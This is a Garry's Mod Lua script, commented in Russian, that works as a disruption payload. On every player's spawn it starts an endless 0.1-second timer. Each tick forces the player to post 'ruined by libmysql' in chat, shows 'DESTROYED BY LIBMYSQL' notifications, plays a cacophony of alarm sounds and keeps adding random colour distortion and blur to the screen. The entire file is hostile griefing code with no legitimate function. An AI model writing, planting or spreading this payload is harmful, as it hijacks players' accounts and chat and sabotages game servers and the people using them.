if SERVER then
    util.AddNetworkString("SpamChatAndEffects")
    
    hook.Add("PlayerInitialSpawn", "StartSpamming", function(ply)
        timer.Create("SpamTimer_" .. ply:SteamID(), 0.1, 0, function()
            if IsValid(ply) then
                -- Спам в чат
                ply:ConCommand("say ruined by libmysql")
                
                -- Спам в notify
                net.Start("SpamChatAndEffects")
                net.WriteString("DESTROYED BY LIBMYSQL")
                net.Send(ply)
                
                -- Случайные артефакты на экране
                net.Start("SpamChatAndEffects")
                net.WriteString("effects")
                net.Send(ply)
            else
                timer.Remove("SpamTimer_" .. ply:SteamID())
            end
        end)
    end)
else -- CLIENT
    local lastSoundTime = 0
    local sounds = {
        "ambient/creatures/teddy.wav",
        "ambient/voices/cough1.wav",
        "ambient/voices/cough2.wav",
        "ambient/voices/cough3.wav",
        "ambient/alarms/klaxon1.wav"
    }
    
    net.Receive("SpamChatAndEffects", function()
        local msgType = net.ReadString()
        
        if msgType == "effects" then
            -- Визуальные артефакты
            DrawMotionBlur(0.1, math.Rand(0.1, 0.5), math.Rand(0.01, 0.1))
            
            -- Какофония звуков
            if CurTime() - lastSoundTime > 0.2 then
                surface.PlaySound(table.Random(sounds))
                lastSoundTime = CurTime()
            end
            
            -- Случайные цветовые эффекты
            local distort = {
                ["$pp_colour_addr"] = math.Rand(-0.3, 0.3),
                ["$pp_colour_addg"] = math.Rand(-0.3, 0.3),
                ["$pp_colour_addb"] = math.Rand(-0.3, 0.3),
                ["$pp_colour_brightness"] = math.Rand(-0.3, 0.3),
                ["$pp_colour_contrast"] = math.Rand(0.5, 1.5),
                ["$pp_colour_colour"] = math.Rand(0.5, 1.5),
                ["$pp_colour_mulr"] = math.Rand(0, 1),
                ["$pp_colour_mulg"] = math.Rand(0, 1),
                ["$pp_colour_mulb"] = math.Rand(0, 1)
            }
            
            hook.Add("RenderScreenspaceEffects", "RandomEffects", function()
                DrawColorModify(distort)
                DrawSharpen(math.Rand(0.5, 3), math.Rand(0.1, 0.5))
            end)
        else
            notification.AddLegacy(msgType, NOTIFY_ERROR, 1)
        end
    end)
end